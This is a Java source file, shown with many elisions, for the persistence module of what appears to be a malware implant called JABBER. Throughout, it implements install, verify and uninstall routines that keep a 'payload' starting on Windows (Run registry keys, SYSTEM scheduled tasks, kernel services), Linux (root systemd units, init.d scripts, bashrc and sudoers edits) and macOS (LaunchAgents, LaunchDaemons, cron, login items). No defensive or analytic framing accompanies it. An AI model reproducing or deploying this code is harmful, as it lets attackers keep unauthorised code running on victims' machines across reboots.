package com.jabber.jabber.modules.persistence;
...
public class PersistenceModule {
    ...
    private class WindowsRegistryRunPersistence implements PersistenceStrategy {
        ...
        public boolean install() {
            try {
                ...
                String command = "cmd.exe /c reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v JABBERPayload /d \"" + payloadPath + "\" /f";
        ...
        public boolean verify() {
            try {
                String command = "cmd.exe /c reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v JABBERPayload";
                Process p = Runtime.getRuntime().exec(command);
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
        ...
        public boolean uninstall() {
            try {
                String command = "cmd.exe /c reg delete HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v JABBERPayload /f";
                Process p = Runtime.getRuntime().exec(command);
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
    ...
    private class WindowsScheduledTaskPersistence implements PersistenceStrategy {
        ...
        public boolean install() {
            try {
                ...
                String command = "schtasks /create /tn JABBERPayload /tr \"" + payloadPath + "\" /sc onstart /ru System /f";
                Process p = Runtime.getRuntime().exec(command);
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
        ...
        public boolean verify() {
            try {
                String command = "schtasks /query /tn JABBERPayload";
                Process p = Runtime.getRuntime().exec(command);
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
        ...
        public boolean uninstall() {
            try {
                String command = "schtasks /delete /tn JABBERPayload /f";
                Process p = Runtime.getRuntime().exec(command);
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
    ...
    private class WindowsServiceInstallationPersistence implements PersistenceStrategy {
        ...
        public boolean install() {
            try {
                String command = "sc.exe create JABBERService binPath= \"" + payloadPath + "\" start= boot type= kernel";
                Process p = Runtime.getRuntime().exec(command);
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
        ...
        public boolean verify() {
            try {
                String command = "sc.exe query JABBERService";
                Process p = Runtime.getRuntime().exec(command);
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
        ...
        public boolean uninstall() {
            try {
                String command = "sc.exe delete JABBERService";
                Process p = Runtime.getRuntime().exec(command);
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
    ...
    private class LinuxSystemdPersistence implements PersistenceStrategy {
        ...
        public boolean install() {
            try {
                String serviceFile = "[Unit]\nDescription=JABBER Payload\nAfter=network.target\n\n" +
                    "[Service]\nType=simple\nExecStart=" + payloadCommand + "\nRestart=always\nUser=root\n\n" +
                    "[Install]\nWantedBy=multi-user.target";
                
                String path = "/etc/systemd/system/jabber-payload.service";
                Files.write(Paths.get(path), serviceFile.getBytes());
                
                String command = "systemctl daemon-reload && systemctl enable jabber-payload.service && systemctl start jabber-payload.service";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
        ...
        public boolean verify() {
            try {
                String command = "systemctl is-active jabber-payload.service";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
        ...
        public boolean uninstall() {
            try {
                String command = "systemctl disable jabber-payload.service && systemctl stop jabber-payload.service && rm /etc/systemd/system/jabber-payload.service && systemctl daemon-reload";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
    ...
    private class LinuxInitdPersistence implements PersistenceStrategy {
        ...
        public boolean install() {
            try {
                String initScript = "#!/bin/bash\n### BEGIN INIT INFO\n# Provides: jabber-payload\n# Required-Start: $network\n# Required-Stop:\n### END INIT INFO\n\ncase \"$1\" in\n" +
                    "start) " + payloadCommand + " ;;\nstop) pkill -f payload ;;\nesac";
                
                String path = "/etc/init.d/jabber-payload";
                Files.write(Paths.get(path), initScript.getBytes());
                
                String command = "chmod +x /etc/init.d/jabber-payload && update-rc.d jabber-payload defaults";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
        ...
        public boolean verify() {
            try {
                return new File("/etc/init.d/jabber-payload").exists();
            } catch (Exception e) {
                return false;
            }
        }
        ...
        public boolean uninstall() {
            try {
                String command = "update-rc.d jabber-payload remove && rm /etc/init.d/jabber-payload";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
    ...
    private class LinuxBashRCPersistence implements PersistenceStrategy {
        ...
        public boolean verify() {
            try {
                ...
                return content.contains("JABBER Payload");
            } catch (Exception e) {
                return false;
            }
        }
        ...
        public boolean uninstall() {
            try {
                ...
                lines.removeIf(line -> line.contains("JABBER Payload"));
    ...
    private class LinuxSudoersPersistence implements PersistenceStrategy {
        ...
        public boolean verify() {
            try {
                String command = "sudo grep JABBER /etc/sudoers";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
        ...
        public boolean uninstall() {
            try {
                String command = "sudo sed -i '/JABBER/d' /etc/sudoers";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
        ...
        public boolean install() {
            try {
                String plist = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                    ...
                    "<key>Label</key><string>com.jabber.payload</string>" +
                    "<key>ProgramArguments</key><array><string>" + payloadPath + "</string></array>" +
                    "<key>RunAtLoad</key><true/>" +
                    "</dict></plist>";
                
                String path = System.getProperty("user.home") + "/Library/LaunchAgents/com.jabber.payload.plist";
    ...
    private class MacOSLaunchDaemonPersistence implements PersistenceStrategy {
        ...
        public boolean install() {
            try {
                String plist = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">" +
                    "<plist version=\"1.0\"><dict>" +
                    "<key>Label</key><string>com.jabber.daemon</string>" +
                    "<key>ProgramArguments</key><array><string>" + payloadPath + "</string></array>" +
                    "<key>RunAtLoad</key><true/>" +
                    "</dict></plist>";
                
                String path = "/Library/LaunchDaemons/com.jabber.daemon.plist";
                Files.write(Paths.get(path), plist.getBytes());
        ...
        @Override
        public boolean verify() {
            return new File("/Library/LaunchDaemons/com.jabber.daemon.plist").exists();
        }
    ...
    private class MacOSCronJobPersistence implements PersistenceStrategy {
        ...
        public boolean verify() {
            try {
                String command = "crontab -l | grep -i jabber";
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                return p.waitFor() == 0;
            } catch (Exception e) {
                return false;
    ...
    private class MacOSLoginItemPersistence implements PersistenceStrategy {
        ...
        public boolean verify() {
            try {
                ...
                return line != null && line.contains("jabber");
            } catch (Exception e) {
                return false;
            }
        }
